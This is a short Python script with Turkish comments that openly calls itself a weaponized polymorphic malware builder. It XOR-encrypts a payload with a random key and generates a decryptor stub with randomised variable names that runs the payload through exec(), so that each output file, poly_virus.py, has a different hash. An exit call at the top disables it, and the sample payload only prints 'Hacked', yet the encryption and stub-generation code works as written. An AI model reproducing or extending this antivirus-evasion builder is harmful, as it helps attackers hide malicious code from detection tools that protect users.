import random
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod FUD (Fully Undetectable) zararlı üretir.")

print("--- WEAPONIZED POLYMORPHIC BUILDER ---")

# Orijinal Zararlı Kod (Örn: Project 172'nin kodu)
ORIGINAL_VIRUS = """
import ctypes
print('Hacked')
"""

def encrypt_payload(payload):
    # 1. RASTGELE BİR ANAHTAR SEÇ
    key = random.randint(1, 255)
    print(f"[*] Şifreleme Anahtarı: {key}")
    
    # 2. XOR ŞİFRELEME (Weaponized Part)
    # Her byte'ı anahtarla işleme sokuyoruz.
    encrypted_bytes = [ord(c) ^ key for c in payload]
    
    return encrypted_bytes, key

def generate_stub(encrypted_data, key):
    # 3. ÇÖZÜCÜ (STUB) OLUŞTURMA
    # Bu kısım virüsün her seferinde farklı görünmesini sağlar.
    # Simülasyonda burası yoktu.
    
    var_name = "v" + str(random.randint(1000,9999))
    key_name = "k" + str(random.randint(1000,9999))
    
    stub = f"""
# Otomatik Üretilmiş Çözücü
{var_name} = {encrypted_data}
{key_name} = {key}
# Çalışma anında (Runtime) şifreyi çöz ve çalıştır
exec("".join([chr(x ^ {key_name}) for x in {var_name}]))
"""
    return stub

if __name__ == "__main__":
    enc_data, key = encrypt_payload(ORIGINAL_VIRUS)
    final_virus = generate_stub(enc_data, key)
    
    with open("poly_virus.py", "w") as f:
        f.write(final_virus)
        
    print("💀 YENİ VİRÜS OLUŞTURULDU: poly_virus.py")
    print("Hash değeri orijinalinden tamamen farklı.")